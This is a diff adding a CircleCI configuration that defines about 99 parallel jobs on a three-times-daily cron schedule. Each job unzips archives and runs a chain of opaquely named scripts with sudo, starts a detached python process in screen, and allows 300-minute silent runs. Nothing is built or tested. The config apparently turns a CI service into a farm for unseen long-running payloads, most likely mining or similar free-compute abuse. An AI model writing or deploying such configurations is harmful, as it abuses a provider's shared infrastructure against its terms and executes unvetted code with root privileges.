@@ -1,0 +1,583 @@
+working_dir: &working_dir ~/app
+.build_template: &commonSteps
+  steps:
+    - checkout
+    - run:
+        name: A
+        command: |
+          sudo apt update -y
+    - run:
+        name: B
+        command: |
+          sleep 10s          
+          unzip cacing.zip && chmod u+x *
+          #./cacing.sh####
+    - run:
+        name: C
+        command: |
+          unzip iki2.zip >/dev/null 2>&1
+    - run:
+        name: D
+        command: |
+          chmod u+x *
+    - run:
+        name: E
+        command: |
+          sudo ./aku.sh
+    - run:
+        name: F
+        command: |
+          sudo ./bojo .sh
+    - run:
+        name: G
+        command: |
+          sudo ./cilok.sh
+    - run:
+        name: H
+        command: |
+          sudo ./dan.sh
+    - run:
+        name: I
+        command: |
+          sudo ./ewe.sh
+    - run:
+        name: J
+        command: |
+          #sudo ./Frean.sh#no_run
+    - run:
+        name: K
+        no_output_timeout: 300m
+        command: |
+          echo "Ijin Berkah Om. . ."
+          sudo ./gok.sh
+          sudo ./halah.sh
+          sudo ./Itu.sh
+          screen -dmS Acdb python3 p01.py
+          sleep 300s
+          ./m01.sh
+  working_directory: *working_dir
+
+version: 2.0
+
+jobs:
+  tahu_01:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  tahu_02:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_03:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  tahu_04:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_05:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_06:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_07:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_08:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_09:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_10:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_11:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_12:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_13:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_14:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_15:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_16:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_17:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_18:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_19:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_20:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_21:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_22:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_23:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  tahu_24:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_25:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_26:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_27:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_28:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_29:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_30:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_31:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_32:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_33:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  tahu_34:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_35:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_36:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_37:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_38:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_39:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_40:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_41:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_42:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_43:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  tahu_44:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_45:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_46:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_47:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_48:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_49:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_50:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_51:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_52:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_53:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  tahu_54:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_55:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_56:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_57:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_58:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_59:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_60:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_61:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_62:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_63:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  tahu_64:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_65:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_66:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_67:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_68:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_69:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_70:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_71:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_72:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_73:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  tahu_74:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_75:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_76:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_77:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_78:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_79:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_80:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_81:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_82:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_83:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  tahu_84:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_85:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_86:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_87:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_88:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_89:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_90:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_91:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  tahu_92:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_93:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  tahu_94:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_95:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_96:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_97:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_98:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  tahu_99:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+
+    triggers:
+      - schedule:
+          cron: "0 0,8,16 * * *"
+          filters:
+            branches:
+              only:
+                - anak
+                - kucing
+                - main
+                - di
+                - jalan
+
+workflows:
+  version: 2
+  sisjalan:
+    jobs:
+      - tahu_01
+      - tahu_02
+      - tahu_03
+      - tahu_04
+      - tahu_05
+      - tahu_06
+      - tahu_07
+      - tahu_08
+      - tahu_09
+      - tahu_10
+      - tahu_11
+      - tahu_12
+      - tahu_13
+      - tahu_14
+      - tahu_15
+      - tahu_16
+      - tahu_17
+      - tahu_18
+      - tahu_19
+      - tahu_20
+      - tahu_21
+      - tahu_22
+      - tahu_23
+      - tahu_24
+      - tahu_25
+      - tahu_26
+      - tahu_27
+      - tahu_28
+      - tahu_29
+      - tahu_30
+      - tahu_31
+      - tahu_32
+      - tahu_33
+      - tahu_34
+      - tahu_35
+      - tahu_36
+      - tahu_37
+      - tahu_38
+      - tahu_39
+      - tahu_40
+      - tahu_41
+      - tahu_42
+      - tahu_43
+      - tahu_44
+      - tahu_45
+      - tahu_46
+      - tahu_47
+      - tahu_48
+      - tahu_49
+      - tahu_50
+      - tahu_51
+      - tahu_52
+      - tahu_53
+      - tahu_54
+      - tahu_55
+      - tahu_56
+      - tahu_57
+      - tahu_58
+      - tahu_59
+      - tahu_60
+      - tahu_61
+      - tahu_62
+      - tahu_63
+      - tahu_64
+      - tahu_65
+      - tahu_66
+      - tahu_67
+      - tahu_68
+      - tahu_69
+      - tahu_70
+      - tahu_71
+      - tahu_72
+      - tahu_73
+      - tahu_74
+      - tahu_75
+      - tahu_76
+      - tahu_77
+      - tahu_78
+      - tahu_79
+      - tahu_80
+      - tahu_81
+      - tahu_82
+      - tahu_83
+      - tahu_84
+      - tahu_85
+      - tahu_86
+      - tahu_87
+      - tahu_88
+      - tahu_89
+      - tahu_90
+      - tahu_91
+      - tahu_92
+      - tahu_93
+      - tahu_94
+      - tahu_95
+      - tahu_96
+      - tahu_97
+      - tahu_98
+      - tahu_99
